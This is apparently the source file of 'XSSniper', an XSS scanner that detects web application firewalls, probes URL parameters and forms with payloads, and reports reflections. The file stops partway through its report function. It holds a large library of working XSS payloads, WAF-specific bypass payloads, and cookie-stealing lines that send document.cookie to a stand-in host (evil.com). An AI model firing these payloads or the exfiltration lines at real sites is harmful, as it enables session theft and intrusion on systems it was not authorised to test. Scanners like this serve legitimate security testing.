#!/usr/bin/env python3
"""
XSSniper - Advanced XSS Vulnerability Scanner
Professional Security Testing Framework
Developed by H4mzaX

Open Source Tool - Free for everyone to use
"""

import hashlib
import hmac
import time
import base64
import os
import sys
import platform
import uuid
import asyncio
import aiohttp
import json
import re
import random
import argparse
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, unquote
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init
from concurrent.futures import ThreadPoolExecutor
import warnings
warnings.filterwarnings("ignore")

# Initialize colorama
init(autoreset=True)

# License system removed - XSSniper is now open source and free for everyone

class AdvancedXSSScanner:
    """Enhanced XSS Scanner with modern detection capabilities"""
    
    def __init__(self, target_url, **kwargs):
        self.target_url = target_url
        self.threads = kwargs.get('threads', 20)
        self.delay = kwargs.get('delay', 0)
        self.verbose = kwargs.get('verbose', False)
        self.output_file = kwargs.get('output_file')  # Only save if user specifies -o
        self.browser_verify = kwargs.get('browser_verify', True)
        self.verify_ssl = kwargs.get('verify_ssl', False)  # Default to False for testing flexibility
        self.waf_bypass = kwargs.get('waf_bypass', False)
        self.forced_waf = kwargs.get('forced_waf', None)
        self.encoding_methods = kwargs.get('encoding_methods', [])
        self.discover_params = kwargs.get('discover_params', False)
        self.all_payloads = kwargs.get('all_payloads', False)
        self.max_retries = 3
        self.timeout = kwargs.get('timeout', 15)
        
        # Session management
        self.session = None
        self.vulnerabilities = []
        self.tested_urls = set()
        self.detected_waf = None
        
        # Headers
        self.headers = {
            'User-Agent': kwargs.get('user_agent') or 
                         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Load modern payloads (combining built-in and external)
        self.payloads = self._load_advanced_payloads()
        self.waf_bypass_payloads = self._load_waf_bypass_payloads()
        
        # Load external payloads if available
        self._load_external_payloads()
        
    def _load_advanced_payloads(self):
        """Load modern XSS payloads based on recent CVEs"""
        return {
            # CVE-2025-24017 - DOM-based XSS payloads
            'dom_based': [
                '<svg onload=alert(document.domain)>',
                '<img src=x onerror=alert(document.domain)>',
                '<iframe srcdoc="<script>alert(parent.document.domain)</script>">',
                '<details open ontoggle=alert(document.domain)>',
                '<marquee onstart=alert(document.domain)>',
                '<video><source onerror=alert(document.domain)>',
                '<audio src=x onerror=alert(document.domain)>',
                '<object data="javascript:alert(document.domain)">',
                '<embed src="javascript:alert(document.domain)">',
                '<form><button formaction="javascript:alert(document.domain)">',
            ],
            
            # CVE-2025-26791 - Template literal and mutation XSS
            'template_literal': [
                '${alert(document.domain)}',
                '`${alert(document.domain)}`',
                '${alert`document.domain`}',
                '${eval("alert(document.domain)")}',
                '${Function("alert(document.domain)")()}',
                '${[].constructor.constructor("alert(document.domain)")()}',
                '${(()=>alert(document.domain))()}',
                '${window["alert"](document.domain)}',
                '${globalThis.alert(document.domain)}',
                '${this.alert(document.domain)}',
            ],
            
            # Mutation XSS (mXSS) payloads
            'mutation_xss': [
                '<listing>&lt;script&gt;alert(document.domain)&lt;/script&gt;</listing>',
                '<xmp>&lt;script&gt;alert(document.domain)&lt;/script&gt;</xmp>',
                '<plaintext>&lt;script&gt;alert(document.domain)&lt;/script&gt;',
                '<noscript><p title="</noscript><script>alert(document.domain)</script>">',
                '<template><script>alert(document.domain)</script></template>',
                '<math><mi//xlink:href="data:x,<script>alert(document.domain)</script>">',
                '<svg><foreignObject><div><script>alert(document.domain)</script></div></foreignObject></svg>',
            ],
            
            # Modern JavaScript framework bypasses
            'framework_bypass': [
                # React XSS
                '<div dangerouslySetInnerHTML={{__html: "javascript:alert(document.domain)"}} />',
                '{{constructor.constructor("alert(document.domain)")()}}',
                
                # Vue.js XSS
                '{{$eval("alert(document.domain)")}}',
                '{{this.constructor.constructor("alert(document.domain)")()}}',
                
                # Angular XSS
                '{{constructor.constructor("alert(document.domain)")()}}',
                '{{toString.constructor.prototype.toString.constructor.prototype.call.call(eval,"alert(document.domain)")}}',
            ],
            
            # CSP bypass techniques
            'csp_bypass': [
                '<link rel=dns-prefetch href="//evil.com">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">',
                '<base href="javascript:alert(document.domain)//">',
                '<script src="data:text/javascript,alert(document.domain)"></script>',
                '<iframe src="data:text/html,<script>alert(parent.document.domain)</script>">',
                '<object data="data:text/html,<script>alert(document.domain)</script>">',
            ],
            
            # WebSocket XSS
            'websocket_xss': [
                '<script>new WebSocket("ws://evil.com").onopen=()=>alert(document.domain)</script>',
                '<script>fetch("//evil.com",{method:"POST",body:document.cookie})</script>',
                '<script>navigator.sendBeacon("//evil.com",document.cookie)</script>',
            ],
            
            # PostMessage XSS
            'postmessage_xss': [
                '<script>window.parent.postMessage("alert(document.domain)","*")</script>',
                '<script>window.top.postMessage("<img src=x onerror=alert(document.domain)>","*")</script>',
            ],
            
            # Unicode and encoding bypasses
            'encoding_bypass': [
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))</script>',
                '<script>alert(document[String.fromCharCode(100,111,109,97,105,110)])</script>',
                '<script>\u0061\u006c\u0065\u0072\u0074(document.domain)</script>',
                '<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.domain)</script>',
                '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(document.domain)">',
            ],
            
            # Modern HTML5 vectors
            'html5_vectors': [
                '<video poster="javascript:alert(document.domain)">',
                '<svg><animate attributeName=href values="javascript:alert(document.domain)" />',
                '<math><maction actiontype="statusline#javascript:alert(document.domain)">',
                '<datalist><option value="<script>alert(document.domain)</script>">',
                '<keygen onfocus=alert(document.domain) autofocus>',
                '<meter value=1 max=1 onmouseover=alert(document.domain)>',
                '<progress value=1 max=1 onmouseover=alert(document.domain)>',
            ]
        }
    
    def _load_external_payloads(self):
        """Load external payloads from JSON file and merge with built-in payloads"""
        try:
            with open('xss_payloads.json', 'r') as f:
                external_payloads = json.load(f)
            
            # Merge external payloads with built-in payloads
            for category, payloads in external_payloads.items():
                if category in self.payloads:
                    # Add external payloads to existing category (avoid duplicates)
                    existing_payloads = set(self.payloads[category])
                    new_payloads = [p for p in payloads if p not in existing_payloads]
                    self.payloads[category].extend(new_payloads)
                else:
                    # Create new category
                    self.payloads[category] = payloads
            
            self.log(f"Loaded external payloads from xss_payloads.json", "SUCCESS")
            
        except FileNotFoundError:
            self.log("xss_payloads.json not found, using built-in payloads only", "WARNING")
        except json.JSONDecodeError:
            self.log("Error parsing xss_payloads.json, using built-in payloads only", "ERROR")
        except Exception as e:
            self.log(f"Error loading external payloads: {str(e)}", "ERROR")
    
    def _load_waf_bypass_payloads(self):
        """Load WAF-specific bypass payloads"""
        return {
            'Cloudflare': [
                '<svg/onload=alert(document.domain)>',
                '<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;">',
                '<math><mi//xlink:href="data:x,<script>alert(document.domain)</script>">',
                'javascript:/*-/*`/*\\`/*\'/*"/**//**/(/**/**/alert(document.domain)/**/)/***//**/',
            ],
            'AWS WAF': [
                '<iframe src=javascript:alert`document.domain`>',
                '<svg onload="[].forEach.call([],alert,document.domain)">',
                '<script>setTimeout(alert,0,document.domain)</script>',
                '<img src=x onerror="[].constructor.constructor`alert(document.domain)`()">',
            ],
            'Akamai': [
                '<details open ontoggle=alert(document.domain)>',
                '<marquee onstart=alert(document.domain)>',
                '<object data="javascript:alert(document.domain)">',
                'javascript:alert(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))',
            ],
            'ModSecurity': [
                '<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>',
                '<script>Function`alert\\u0028document.domain\\u0029```</script>',
                '<svg><script>alert&#40;document.domain&#41;</script></svg>',
                'javascript:/*-/*`/*\\`/*\'/*"/**//**/(/**/**/alert(/*/document.domain/**/)/***//**/',
            ]
        }

    async def init_session(self):
        """Initialize async HTTP session with proper SSL handling"""
        import ssl
        
        # Create SSL context that handles certificate verification issues
        ssl_context = ssl.create_default_context()
        if self.verify_ssl is False:
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=30,
            ssl=ssl_context,
            enable_cleanup_closed=True
        )
        
        self.session = aiohttp.ClientSession(
            headers=self.headers,
            timeout=timeout,
            connector=connector
        )

    async def close_session(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()

    def log(self, message, level="INFO", payload=None):
        """Enhanced logging function with beautiful colored output"""
        timestamp = time.strftime("%H:%M:%S")
        colors = {
            "INFO": Fore.CYAN + Style.BRIGHT,
            "SUCCESS": Fore.GREEN + Style.BRIGHT,
            "WARNING": Fore.YELLOW + Style.BRIGHT,
            "ERROR": Fore.RED + Style.BRIGHT,
            "VULN": Fore.RED + Back.YELLOW + Style.BRIGHT,
            "PAYLOAD": Fore.MAGENTA + Style.BRIGHT,
            "WAF": Fore.BLUE + Style.BRIGHT,
            "PARAM": Fore.CYAN,
            "TEST": Fore.WHITE
        }
        
        color = colors.get(level, Fore.WHITE)
        
        # Enhanced output formatting
        if level == "VULN":
            print(f"\n{color}🎯 [VULNERABILITY FOUND] {Style.RESET_ALL}")
            print(f"{color}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}⏰ Time: {timestamp}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}📍 {message}{Style.RESET_ALL}")
            if payload:
                print(f"{Fore.MAGENTA + Style.BRIGHT}🚀 Payload: {payload}{Style.RESET_ALL}")
            print(f"{color}{'='*60}{Style.RESET_ALL}\n")
        elif level == "SUCCESS":
            print(f"{color}✅ [{timestamp}] {message}{Style.RESET_ALL}")
        elif level == "ERROR":
            print(f"{color}❌ [{timestamp}] {message}{Style.RESET_ALL}")
        elif level == "WARNING":
            print(f"{color}⚠️  [{timestamp}] {message}{Style.RESET_ALL}")
        elif level == "PAYLOAD":
            print(f"{color}🧪 [{timestamp}] Testing payload: {message}{Style.RESET_ALL}")
        elif level == "TEST":
            if self.verbose:
                print(f"{color}🔍 [{timestamp}] {message}{Style.RESET_ALL}")
        else:
            if self.verbose or level in ["SUCCESS", "VULN", "ERROR", "WARNING"]:
                print(f"{color}ℹ️  [{timestamp}] {message}{Style.RESET_ALL}")
    
    def show_progress(self, current, total, param_name, task_type="Testing"):
        """Show animated progress bar with single line update"""
        import sys
        
        # Calculate progress percentage
        progress = (current / total) * 100
        
        # Create progress bar animation
        bar_length = 25
        filled_length = int(bar_length * current // total)
        
        # Animation characters
        animations = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        spinner = animations[current % len(animations)]
        
        # Progress bar
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        
        # Color based on progress
        if progress < 25:
            color = Fore.RED
        elif progress < 50:
            color = Fore.YELLOW
        elif progress < 75:
            color = Fore.BLUE
        else:
            color = Fore.GREEN
        
        # Create the progress line
        progress_line = f"\r{color}{spinner} {task_type} '{param_name}' [{bar}] {current}/{total} ({progress:.1f}%){Style.RESET_ALL}"
        
        # Print with carriage return to overwrite previous line
        sys.stdout.write(progress_line)
        sys.stdout.flush()
        
        # Add newline when complete
        if current == total:
            print()  # Move to next line when done

    async def detect_waf(self, url):
        """Enhanced WAF detection"""
        self.log("Detecting WAF presence...", "INFO")
        
        waf_indicators = {
            "Cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
            "AWS WAF": ["awswaf", "x-amzn-requestid"],
            "Akamai": ["akamai", "akamai-ghost"],
            "Imperva": ["incapsula", "imperva", "x-iinfo"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "F5 BIG-IP": ["f5", "bigip", "x-waf-event"],
            "Barracuda": ["barracuda", "barra"],
            "Fortinet": ["fortinet", "fortigate"]
        }
        
        try:
            async with self.session.get(url) as response:
                headers = response.headers
                content = await response.text()
                
                for waf_name, indicators in waf_indicators.items():
                    for indicator in indicators:
                        # Check headers
                        for header_name, header_value in headers.items():
                            if indicator.lower() in header_name.lower() or indicator.lower() in header_value.lower():
                                self.detected_waf = waf_name
                                self.log(f"WAF Detected: {waf_name}", "WARNING")
                                return waf_name
                        
                        # Check content
                        if indicator in content.lower():
                            self.detected_waf = waf_name
                            self.log(f"WAF Detected: {waf_name}", "WARNING")
                            return waf_name
        except:
            pass
        
        return None

    async def test_single_payload(self, url, payload, param_name=None, method='GET', form_data=None):
        """Test individual payload with enhanced detection and confidence scoring"""
        try:
            unique_id = f"XSS{random.randint(1000, 9999)}"
            test_payload = payload.replace('document.domain', f'"{unique_id}"')
            test_url = url
            
            if method.upper() == 'GET' and param_name:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[param_name] = [test_payload]
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(params, doseq=True)}"
                
                async with self.session.get(test_url) as response:
                    response_text = await response.text()
                    status_code = response.status
                    content_type = response.headers.get('content-type', '')
                    
            elif method.upper() == 'POST' and form_data:
                if param_name:
                    form_data[param_name] = test_payload
                
                async with self.session.post(url, data=form_data) as response:
                    response_text = await response.text()
                    status_code = response.status
                    content_type = response.headers.get('content-type', '')
            else:
                test_url = f"{url}{test_payload}"
                async with self.session.get(test_url) as response:
                    response_text = await response.text()
                    status_code = response.status
                    content_type = response.headers.get('content-type', '')
            
            # Enhanced XSS detection with confidence scoring
            if status_code == 200:
                is_vulnerable = self.is_xss_reflected(response_text, unique_id, content_type, test_payload)
                
                if is_vulnerable:
                    # Calculate confidence based on detection method
                    confidence = self.calculate_detection_confidence(response_text, unique_id, test_payload, content_type)
                    
                    return {
                        'vulnerable': True,
                        'url': url,
                        'test_url': test_url,
                        'payload': payload,
                        'test_payload': test_payload,
                        'parameter': param_name,
                        'method': method,
                        'unique_id': unique_id,
                        'content_type': content_type,
                        'confidence': confidence,
                        'reflection_type': self.get_reflection_type(response_text, test_payload)
                    }
            
            return {'vulnerable': False}
            
        except Exception as e:
            if self.verbose:
                self.log(f"Error testing payload: {str(e)}", "ERROR")
            return {'vulnerable': False}

    def is_xss_reflected(self, response_text, unique_id, content_type, payload):
        """Enhanced XSS reflection detection with strict context analysis to avoid false positives"""
        if unique_id not in response_text:
            return False
        
        # Don't flag JSON responses, API endpoints, or other non-HTML content
        safe_content_types = ['application/json', 'application/xml', 'text/plain', 'application/javascript']
        for safe_type in safe_content_types:
            if safe_type in content_type.lower():
                return False
        
        # Get the actual payload that was sent (decode unique_id back)
        original_payload = payload.replace('document.domain', f'"{unique_id}"')
        
        # Check for STRICT XSS execution contexts - must be unescaped and executable
        strict_patterns = [
            # Script tag with unescaped content
            f'<script[^>]*>[^<]*{re.escape(unique_id)}[^<]*</script>',
            
            # Event handlers with unescaped content (not in quoted attributes)
            rf'<[^>]+\s(?:onload|onerror|onclick|onmouseover)\s*=\s*[^"\'][^>]*{re.escape(unique_id)}[^>]*>',
            
            # JavaScript URLs in href/src (unescaped)
            rf'<[^>]+\s(?:href|src)\s*=\s*["\']?javascript:[^"\'>]*{re.escape(unique_id)}[^"\'>]*["\']?[^>]*>',
            
            # SVG onload with unescaped content
            rf'<svg[^>]*\sonload\s*=\s*[^"\'][^>]*{re.escape(unique_id)}[^>]*>',
            
            # Iframe srcdoc with script execution
            rf'<iframe[^>]*\ssrcdoc\s*=\s*["\'][^"\'>]*<script[^>]*>{re.escape(unique_id)}[^<]*</script>[^"\'>]*["\'][^>]*>'
        ]
        
        # Only flag if payload is in UNESCAPED executable context
        for pattern in strict_patterns:
            matches = re.finditer(pattern, response_text, re.IGNORECASE | re.DOTALL)
            for match in matches:
                context = match.group(0)
                # Additional check: ensure the payload isn't HTML-escaped
                if ('&lt;' not in context and '&gt;' not in context and 
                    '&quot;' not in context and '&#' not in context):
                    return True
        
        # Check if full original payload is reflected unescaped in dangerous contexts
        if original_payload in response_text:
            # Verify it's in executable context and not escaped
            dangerous_full_payload_patterns = [
                f'<script[^>]*>[^<]*{re.escape(original_payload)}[^<]*</script>',
                rf'<[^>]+\s(?:onload|onerror)\s*=\s*[^"\'][^>]*{re.escape(original_payload)}[^>]*>',
                rf'<svg[^>]*\sonload\s*=\s*[^"\'][^>]*{re.escape(original_payload)}[^>]*>'
            ]
            
            for pattern in dangerous_full_payload_patterns:
                matches = re.finditer(pattern, response_text, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    context = match.group(0)
                    # Ensure not escaped
                    if ('&lt;' not in context and '&gt;' not in context and 
                        '&quot;' not in context and '&#' not in context):
                        return True
        
        return False

    def calculate_detection_confidence(self, response_text, unique_id, test_payload, content_type):
        """Calculate confidence score for XSS detection"""
        confidence_score = 0
        
        # High confidence indicators
        if f'<script>{unique_id}' in response_text or f'<script>alert("{unique_id}")' in response_text:
            confidence_score += 90
        elif f'onload=alert("{unique_id}")' in response_text or f'onerror=alert("{unique_id}")' in response_text:
            confidence_score += 85
        elif f'javascript:alert("{unique_id}")' in response_text:
            confidence_score += 80
        elif unique_id in response_text and 'text/html' in content_type:
            confidence_score += 60
        
        # Penalty for potentially safe contexts
        if '&lt;' in response_text or '&gt;' in response_text:
            confidence_score -= 30
        if 'application/json' in content_type:
            confidence_score -= 50
        
        # Ensure confidence is between 0-100
        confidence_score = max(0, min(100, confidence_score))
        
        if confidence_score >= 80:
            return 'Very High'
        elif confidence_score >= 60:
            return 'High'
        elif confidence_score >= 40:
            return 'Medium'
        else:
            return 'Low'
    
    def get_reflection_type(self, response_text, payload):
        """Determine the type of XSS reflection"""
        if '<script>' in payload and '<script>' in response_text:
            return 'Script Tag Injection'
        elif 'onerror=' in payload and 'onerror=' in response_text:
            return 'Event Handler Injection'
        elif 'javascript:' in payload and 'javascript:' in response_text:
            return 'JavaScript URL Injection'
        elif '${' in payload and '${' in response_text:
            return 'Template Literal Injection'
        elif 'dangerouslySetInnerHTML' in response_text:
            return 'React dangerouslySetInnerHTML'
        elif '<svg' in payload and '<svg' in response_text:
            return 'SVG-based XSS'
        elif 'data:' in payload and 'data:' in response_text:
            return 'Data URI XSS'
        else:
            return 'Direct Reflection'

    async def scan_url_parameters(self, url):
        """Scan URL parameters for XSS vulnerabilities"""
        self.log(f"Scanning URL parameters: {url}", "INFO")
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            # Try to discover parameters
            params = await self.discover_parameters(url)
        
        for param_name in params.keys():
            self.log(f"Testing parameter: {param_name}", "INFO")
            
            # Get appropriate payloads based on detected WAF
            if self.detected_waf and self.detected_waf in self.waf_bypass_payloads:
                self.log(f"Using WAF bypass payloads for {self.detected_waf}", "WAF")
                test_payloads = self.waf_bypass_payloads[self.detected_waf] + self.payloads['dom_based']
            else:
                # Use all payload categories
                test_payloads = []
                for category_name, category_payloads in self.payloads.items():
                    self.log(f"Loading {len(category_payloads)} payloads from {category_name} category", "INFO")
                    test_payloads.extend(category_payloads)
            
            # Start testing message
            print(f"{Fore.CYAN}🧪 Starting payload tests on parameter '{param_name}' ({len(test_payloads)} payloads){Style.RESET_ALL}")
            
            # Test payloads with animated progress
            for i, payload in enumerate(test_payloads, 1):
                # Show animated progress
                self.show_progress(i, len(test_payloads), param_name, "Testing parameter")
                
                result = await self.test_single_payload(url, payload, param_name, 'GET')
                
                if result['vulnerable']:
                    vuln = {
                        'type': 'Reflected XSS',
                        'url': result['url'],
                        'parameter': param_name,
                        'payload': result['payload'],
                        'method': 'GET',
                        'reflection_type': result['reflection_type'],
                        'severity': self.calculate_severity(result),
                        'cve_related': self.map_to_cve(result['payload']),
                        'test_url': result.get('test_url', result['url']),
                        'confidence': result.get('confidence', 'High')
                    }
                    self.vulnerabilities.append(vuln)
                    
                    # Show detailed vulnerability information
                    print(f"\n{Fore.RED + Back.YELLOW + Style.BRIGHT}🎯 VULNERABILITY DETECTED! 🎯{Style.RESET_ALL}")
                    print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}📍 Parameter: {Fore.YELLOW + Style.BRIGHT}{param_name}{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}🎯 Type: {Fore.GREEN + Style.BRIGHT}{result['reflection_type']}{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}🚀 Successful Payload: {Fore.MAGENTA + Style.BRIGHT}{result['payload']}{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}🌐 Test URL: {Fore.CYAN}{result.get('test_url', result['url'])[:100]}{'...' if len(result.get('test_url', result['url'])) > 100 else ''}{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}📊 Confidence: {Fore.GREEN + Style.BRIGHT}{result.get('confidence', 'High')}{Style.RESET_ALL}")
                    print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}\n")
                    
                    # Stop testing this parameter if vulnerability found (unless --all-payloads is used)
                    if not self.all_payloads:
                        self.log(f"Vulnerability found, skipping remaining payloads for {param_name} (use --all-payloads to test all)", "INFO")
                        break
                
                if self.delay:
                    await asyncio.sleep(self.delay)

    def calculate_severity(self, result):
        """Calculate vulnerability severity based on context"""
        high_risk_indicators = [
            'Script Tag Injection',
            'Template Literal Injection',
            'React dangerouslySetInnerHTML',
            'Data URI XSS'
        ]
        
        if result['reflection_type'] in high_risk_indicators:
            return 'High'
        elif 'Event Handler' in result['reflection_type']:
            return 'Medium'
        else:
            return 'Low'

    def map_to_cve(self, payload):
        """Map payload to related CVE"""
        cve_mapping = {
            'template_literal': ['CVE-2025-26791'],
            'dom_based': ['CVE-2025-24017'],
            'mutation_xss': ['CVE-2025-26791'],
            'framework_bypass': ['CVE-2024-49646']
        }
        
        for category, payloads in self.payloads.items():
            if payload in payloads:
                return cve_mapping.get(category, [])
        return []

    async def discover_parameters(self, url):
        """Advanced parameter discovery"""
        self.log("Discovering potential parameters...", "INFO")
        
        common_params = [
            'id', 'page', 'search', 'q', 'query', 'name', 'user', 'cat', 'category',
            'type', 'action', 'view', 'file', 'path', 'url', 'redirect', 'next',
            'callback', 'return', 'goto', 'target', 'data', 'value', 'input',
            'term', 'keyword', 'filter', 'sort', 'order', 'limit', 'offset'
        ]
        
        discovered_params = {}
        base_url = url.rstrip('/')
        
        for param in common_params:
            test_url = f"{base_url}?{param}=test123"
            try:
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        if 'test123' in content or param in content:
                            discovered_params[param] = 'test123'
                            self.log(f"Discovered parameter: {param}", "SUCCESS")
            except:
                continue
            
            if self.delay:
                await asyncio.sleep(self.delay * 0.1)  # Shorter delay for discovery
        
        return discovered_params

    async def scan_forms(self, url):
        """Scan HTML forms for XSS vulnerabilities"""
        self.log(f"Scanning forms: {url}", "INFO")
        
        try:
            async with self.session.get(url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                forms = soup.find_all('form')
                
                for form in forms:
                    action = form.get('action')
                    method = form.get('method', 'get').lower()
                    
                    if action:
                        if action.startswith('/'):
                            action_url = urljoin(url, action)
                        elif action.startswith('http'):
                            action_url = action
                        else:
                            action_url = urljoin(url, action)
                    else:
                        action_url = url
                    
                    # Get form inputs
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    form_data = {}
                    
                    for input_tag in inputs:
                        name = input_tag.get('name')
                        if name:
                            input_type = input_tag.get('type', 'text')
                            if input_type not in ['submit', 'button', 'hidden']:
                                form_data[name] = 'test'
                    
                    # Test each input
                    for input_name in form_data.keys():
                        self.log(f"Testing form input: {input_name}", "INFO")
                        
                        # Select appropriate payloads
                        if self.detected_waf and self.detected_waf in self.waf_bypass_payloads:
                            self.log(f"Using WAF bypass payloads for {self.detected_waf}", "WAF")
                            test_payloads = self.waf_bypass_payloads[self.detected_waf] + self.payloads['dom_based']
                        else:
                            test_payloads = []
                            for category in self.payloads.values():
                                test_payloads.extend(category[:5])  # Limit for performance
                        
                        # Start testing message for forms
                        print(f"{Fore.CYAN}🧪 Starting payload tests on form input '{input_name}' ({len(test_payloads)} payloads){Style.RESET_ALL}")
                        
                        # Test form inputs with animated progress
                        for i, payload in enumerate(test_payloads, 1):
                            # Show animated progress
                            self.show_progress(i, len(test_payloads), input_name, "Testing form input")
                            
                            result = await self.test_single_payload(action_url, payload, input_name, method, form_data.copy())
                            
                            if result['vulnerable']:
                                vuln = {
                                    'type': 'Reflected XSS',
                                    'url': result['url'],
                                    'parameter': input_name,
                                    'payload': result['payload'],
                                    'method': method.upper(),
                                    'reflection_type': result['reflection_type'],
                                    'severity': self.calculate_severity(result),
                                    'cve_related': self.map_to_cve(result['payload']),
                                    'test_url': result.get('test_url', result['url']),
                                    'confidence': result.get('confidence', 'High')
                                }
                                self.vulnerabilities.append(vuln)
                                
                                # Show detailed vulnerability information
                                print(f"\n{Fore.RED + Back.YELLOW + Style.BRIGHT}🎯 VULNERABILITY DETECTED! 🎯{Style.RESET_ALL}")
                                print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}")
                                print(f"{Fore.WHITE}📍 Form Input: {Fore.YELLOW + Style.BRIGHT}{input_name}{Style.RESET_ALL}")
                                print(f"{Fore.WHITE}🎯 Type: {Fore.GREEN + Style.BRIGHT}{result['reflection_type']}{Style.RESET_ALL}")
                                print(f"{Fore.WHITE}🚀 Successful Payload: {Fore.MAGENTA + Style.BRIGHT}{result['payload']}{Style.RESET_ALL}")
                                print(f"{Fore.WHITE}🌐 Test URL: {Fore.CYAN}{result.get('test_url', result['url'])[:100]}{'...' if len(result.get('test_url', result['url'])) > 100 else ''}{Style.RESET_ALL}")
                                print(f"{Fore.WHITE}📊 Confidence: {Fore.GREEN + Style.BRIGHT}{result.get('confidence', 'High')}{Style.RESET_ALL}")
                                print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}\n")
                                
                                if not self.all_payloads:
                                    break
                            
                            if self.delay:
                                await asyncio.sleep(self.delay)
        
        except Exception as e:
            self.log(f"Error scanning forms: {str(e)}", "ERROR")

    async def scan_single_url(self, url):
        """Scan a single URL comprehensively"""
        self.log(f"Scanning URL: {url}", "INFO")
        
        # WAF detection
        if not self.detected_waf:
            await self.detect_waf(url)
        
        # Scan URL parameters
        await self.scan_url_parameters(url)
        
        # Scan forms
        await self.scan_forms(url)

    async def scan(self, crawl=False, max_depth=2):
        """Main scanning function with async support"""
        self.log("Starting advanced XSS scan...", "INFO")
        
        # Initialize session
        await self.init_session()
        
        try:
            urls_to_test = [self.target_url]
            
            if crawl:
                self.log("Crawling for additional URLs...", "INFO")
                # Implement crawling logic here
                pass
            
            # Use semaphore to limit concurrent requests
            semaphore = asyncio.Semaphore(self.threads)
            
            async def scan_with_semaphore(url):
                async with semaphore:
                    await self.scan_single_url(url)
            
            # Scan all URLs concurrently
            tasks = [scan_with_semaphore(url) for url in urls_to_test]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Generate report
            self.generate_report()
            
        finally:
            await self.close_session()

    def generate_report(self):
        """Generate comprehensive scan report with beautiful formatting"""
        print("\n" + f"{Fore.CYAN + Style.BRIGHT}{'═'*80}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA + Style.BRIGHT}    🎯 XSS SCAN REPORT - Advanced Security Testing Framework 🎯{Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}{'═'*80}{Style.RESET_ALL}")
        
        # Scan Summary
        print(f"\n{Fore.WHITE + Style.BRIGHT}📊 SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*50}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}🌐 Target URL: {Fore.YELLOW}{self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}⏰ Scan Time: {Fore.YELLOW}{time.strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}🧵 Threads: {Fore.YELLOW}{self.threads}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}⏱️  Delay: {Fore.YELLOW}{self.delay}s{Style.RESET_ALL}")
        
        if self.detected_waf:
            print(f"{Fore.WHITE}🛡️  WAF Detected: {Fore.RED + Style.BRIGHT}{self.detected_waf}{Style.RESET_ALL}")
        else:
            print(f"{Fore.WHITE}🛡️  WAF Status: {Fore.GREEN}Not detected{Style.RESET_ALL}")
        
        # Vulnerability Results
        print(f"\n{Fore.WHITE + Style.BRIGHT}🔍 VULNERABILITY RESULTS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*50}{Style.RESET_ALL}")
        
        if not self.vulnerabilities:
            print(f"{Fore.GREEN + Style.BRIGHT}✅ No XSS vulnerabilities found - Target appears secure!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED + Style.BRIGHT}⚠️  Found {len(self.vulnerabilities)} XSS vulnerabilit{'ies' if len(self.vulnerabilities) > 1 else 'y'}:{Style.RESET_ALL}")
            print()
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                severity_color = {
                    'High': Fore.RED + Style.BRIGHT,
                    'Medium': Fore.YELLOW + Style.BRIGHT,
                    'Low': Fore.BLUE + Style.BRIGHT
                }.get(vuln['severity'], Fore.WHITE)
                
                print(f"{Fore.RED + Style.BRIGHT}┌─ [{i}] {vuln['type']} ─ {severity_color}{vuln['severity']} SEVERITY{Style.RESET_ALL}")
                print(f"{Fore.WHITE}│ 🌐 URL: {Fore.CYAN}{vuln['url'][:80]}{'...' if len(vuln['url']) > 80 else ''}{Style.RESET_ALL}")
